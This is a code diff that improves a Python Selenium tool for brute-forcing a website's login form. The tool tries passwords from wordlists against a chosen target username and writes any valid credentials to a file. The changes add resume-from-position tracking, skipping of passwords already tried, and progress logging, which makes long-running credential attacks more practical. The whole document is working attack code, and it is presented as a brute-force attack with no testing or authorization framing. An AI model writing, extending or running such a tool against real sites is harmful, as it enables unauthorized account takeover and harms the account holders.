@@ -30,6 +30,7 @@ logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
 CHROME_DVR_DIR = r'C:\webdrivers\chromedriver.exe'
 
 def read_web_info(file_path='web_info.txt'):
+    """Read key-value pairs from the web info file."""
     web_info = {}
     try:
         with open(file_path, 'r') as f:
@@ -44,7 +45,25 @@ def read_web_info(file_path='web_info.txt'):
         exit()
     return web_info
 
+def update_web_info(file_path='web_info.txt', updates={}):
+    """Update key-value pairs in the web info file."""
+    try:
+        web_info = {}
+        with open(file_path, 'r') as f:
+            for line in f:
+                key, value = line.strip().split(': ', 1)
+                web_info[key] = value
+
+        web_info.update(updates)
+
+        with open(file_path, 'w') as f:
+            for key, value in web_info.items():
+                f.write(f"{key}: {value}\n")
+    except Exception as e:
+        logging.error(f"Error updating web_info.txt: {str(e)}")
+
 def test_website_access(website):
+    """Test if the website is accessible."""
     try:
         response = requests.get(website)
         if response.status_code == 200:
@@ -58,6 +77,7 @@ def test_website_access(website):
     return True
 
 def log_valid_credential(username, password):
+    """Log valid credentials to a file."""
     with open('valid_credentials.txt', 'a') as f:
         f.write(f"{username}: {password}\n")
 
@@ -77,7 +97,16 @@ def get_password_lists():
 
     return password_lists
 
-def brutes(username, username_selector, password_selector, login_btn_selector, password_lists, website):
+def read_tried_passwords(file_path='tried_passwords.txt'):
+    """Retrieve passwords that have already been tried from a log file."""
+    tried_passwords = set()
+    if os.path.exists(file_path):
+        with open(file_path, 'r') as f:
+            tried_passwords = {line.strip() for line in f}
+    return tried_passwords
+
+def brutes(username, username_selector, password_selector, login_btn_selector, password_lists, website, current_positions):
+    """Perform a brute-force attack with the given password lists."""
     options = Options()
     options.add_argument("--disable-popup-blocking")
     options.add_argument("--disable-extensions")
@@ -85,7 +114,14 @@ def brutes(username, username_selector, password_selector, login_btn_selector, p
     service = Service(CHROME_DVR_DIR)
     browser = webdriver.Chrome(service=service, options=options)
 
-    for pass_path in password_lists:
+    # Retrieve passwords that have already been tried
+    tried_passwords = read_tried_passwords()
+
+    for idx, pass_path in enumerate(password_lists):
+        # Retrieve current position from web_info.txt
+        if pass_path not in current_positions:
+            current_positions[pass_path] = 0
+
         try:
             with open(pass_path, 'r') as f:
                 passwords = f.readlines()
@@ -94,7 +130,15 @@ def brutes(username, username_selector, password_selector, login_btn_selector, p
             logging.error(f"Password list {os.path.basename(pass_path)} not found in 'pw' directory.")
             continue
 
-        for password in passwords:
+        total_passwords = len(passwords)
+
+        for i in range(current_positions[pass_path], total_passwords):
+            password = passwords[i].strip()
+
+            # Skip passwords that have already been tried
+            if password in tried_passwords:
+                continue
+
             try:
                 browser.get(website)
                 t.sleep(2)
@@ -104,18 +148,31 @@ def brutes(username, username_selector, password_selector, login_btn_selector, p
                 enter = browser.find_element(By.CSS_SELECTOR, login_btn_selector)
 
                 Sel_user.send_keys(username)
-                Sel_pas.send_keys(password.strip())
+                Sel_pas.send_keys(password)
 
                 enter.click()
                 t.sleep(5)
 
+                # Update the position marker in web_info.txt
+                current_positions[pass_path] = i + 1
+                update_web_info(updates={f"{os.path.basename(pass_path)}_position": current_positions[pass_path]})
+
+                # Log the tried password
+                with open('tried_passwords.txt', 'a') as log_file:
+                    log_file.write(f"{password}\n")
+
                 # Check login success and log valid credentials
                 if browser.current_url != website:
-                    logging.info(f"Valid credentials found: {username} / {password.strip()}")
-                    log_valid_credential(username, password.strip())
+                    logging.info(f"Valid credentials found: {username} / {password}")
+                    log_valid_credential(username, password)
                     exit()
 
-                logging.info(f"Tried password: {password.strip()} for user: {username}")
+                # Calculate progress percentage
+                remaining_passwords = total_passwords - current_positions[pass_path]
+                progress_percentage = 100 * (i + 1) / total_passwords
+
+                logging.info(f"Tried password: {password} for user: {username}")
+                logging.info(f"Progress: {progress_percentage:.2f}% ({remaining_passwords} passwords left)")
             except NoSuchElementException:
                 logging.error("An element is missing, which could indicate either the password was found or you are locked out.")
                 exit()
@@ -131,6 +188,7 @@ def brutes(username, username_selector, password_selector, login_btn_selector, p
                 exit()
 
 def wizard():
+    """Handle the overall brute-force attack through an interactive workflow."""
     web_info = read_web_info()
 
     website = web_info.get('website')
@@ -144,13 +202,20 @@ def wizard():
     target_username = web_info.get('target_username', '')
     password_lists = get_password_lists()
 
+    # Retrieve starting positions from web_info.txt
+    current_positions = {
+        path: int(web_info.get(f"{os.path.basename(path)}_position", 0))
+        for path in password_lists
+    }
+
     brutes(
         target_username,
         web_info['username_selector'],
         web_info['password_selector'],
         web_info['login_button_selector'],
         password_lists,
-        website
+        website,
+        current_positions
     )
 
 # Argument parsing
@@ -165,11 +230,19 @@ if not (options.website and options.passlists):
 else:
     web_info = read_web_info()
     password_lists = get_password_lists() if not options.passlists else options.passlists.split(',')
+
+    # Retrieve starting positions from web_info.txt
+    current_positions = {
+        path: int(web_info.get(f"{os.path.basename(path)}_position", 0))
+        for path in password_lists
+    }
+
     brutes(
         web_info.get('target_username', ''),
         web_info['username_selector'],
         web_info['password_selector'],
         web_info['login_button_selector'],
         password_lists,
-        options.website
+        options.website,
+        current_positions
     )
